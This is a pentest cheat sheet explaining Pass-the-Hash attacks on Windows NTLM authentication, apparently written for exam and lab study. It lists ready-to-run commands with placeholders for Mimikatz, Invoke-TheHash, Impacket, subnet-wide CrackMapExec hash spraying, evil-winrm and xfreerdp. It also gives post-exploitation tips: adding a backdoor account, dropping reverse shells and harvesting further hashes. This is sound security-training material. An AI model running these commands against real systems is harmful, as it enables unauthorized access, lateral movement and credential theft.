🔐 WHAT IS PtH (Pass-the-Hash)?
PtH lets you authenticate with a hash instead of a plaintext password. You’re not cracking it. You’re using it as-is — because NTLM authentication accepts a valid hash as proof of identity.

⚠️ Hash = password for NTLM. If you got the hash, you got access.

🧠 WHEN Can You Use PtH?
Once you:

🔓 Have admin rights on a box, and

🪣 Extract NTLM hashes from:

SAM (local user hashes)

NTDS.dit (domain user hashes)

lsass.exe (active session hashes via tools like Mimikatz)

💣 Why PtH Still Works in 2025
NTLM is still enabled for legacy compatibility.

Most orgs haven’t fully disabled NTLM or configured mitigations like LAPS or Credential Guard.

🛠️ TOOLS & WORKFLOWS
🔧 1. Mimikatz (Windows - Direct Session Spawn)
Uses the sekurlsa::pth module to spawn a shell as that user with only their hash.

bash
Copy
Edit
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTLM_HASH> /domain:inlanefreight.htb /run:cmd.exe"
🚨 Must be run as admin on the box.

🔧 2. Invoke-TheHash (Windows PowerShell)
SMB or WMI-based command execution remotely.

Works great for:

Creating users

Spawning reverse shells

Testing access without GUI

powershell
Copy
Edit
Invoke-SMBExec -Target <IP> -Username <user> -Domain <domain> -Hash <NTLM> -Command "<your command>"
Invoke-WMIExec ... # same syntax, different channel
✅ No local admin rights needed on the attacker machine.
❗ The account used must be admin on the target system.

🔧 3. Impacket (Linux - Super Versatile)
Perfect for Linux-based attackers or exam machines.

✅ impacket-psexec
Most classic — spawns a SYSTEM shell remotely.

bash
Copy
Edit
impacket-psexec administrator@<ip> -hashes :<ntlm>
✅ impacket-wmiexec, atexec, smbexec
Other options depending on port access or stealth required.

🔧 4. CrackMapExec (Linux - Mass Spray + WinRM + SMB + Enumeration)
Spray an NTLM hash across a subnet.

Spot reused local admin hashes across hosts.

bash
Copy
Edit
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>
Add -x <cmd> to run a command if it hits. Add --local-auth if it's a local account hash.

🔧 5. evil-winrm (Linux - Remote PowerShell with Hash)
Auth via WinRM using a hash.

Super stable and often exam-friendly.

bash
Copy
Edit
evil-winrm -i <IP> -u <user> -H <ntlm_hash>
Works when WinRM is exposed and the account has admin rights.

🔧 6. xfreerdp (GUI PtH via RDP - Linux)
If the target allows RDP and Restricted Admin Mode is enabled:

bash
Copy
Edit
xfreerdp /v:<ip> /u:<user> /pth:<hash>
🧱 Fails unless Restricted Admin is enabled on the target (rare in real life unless explicitly configured).

🧠 TACTICAL NOTES
✅ Domain Account = Lateral Movement Gold
Admin on multiple machines? PtH lets you pivot host-to-host.

CrackMapExec and Impacket tools are perfect for quick access confirmation.

⚠️ UAC Blockers
If LocalAccountTokenFilterPolicy is set to block local admin remote usage, even RID-500 can be blocked unless that registry key is set correctly.

🧨 Common Real-World Weakness
Shared local admin passwords reused across fleet → PtH works on all.

Use CME to spray and spot it fast.

bash
Copy
Edit
crackmapexec smb 10.0.0.0/24 -u Administrator -H <hash> --local-auth
🧰 Post-Ex Tips
Once PtH works:

Deploy a user (net user backdoor P@ss /add)

Drop a reverse shell (PowerShell, MSBuild, or Nishang-based)

Harvest more hashes from the new box (lsass, mimikatz, ProcDump)

✅ TL;DR: EXAM & REAL WORLD
Use Case	Tool	Platform
Spawn shell on compromised box	mimikatz sekurlsa::pth	Windows
Remote cmd with hash	Invoke-TheHash (SMB/WMI)	Windows
Shell from Linux	impacket-psexec / evil-winrm	Linux
Subnet-wide admin test	CrackMapExec	Linux
GUI Access	xfreerdp + /pth	Linux
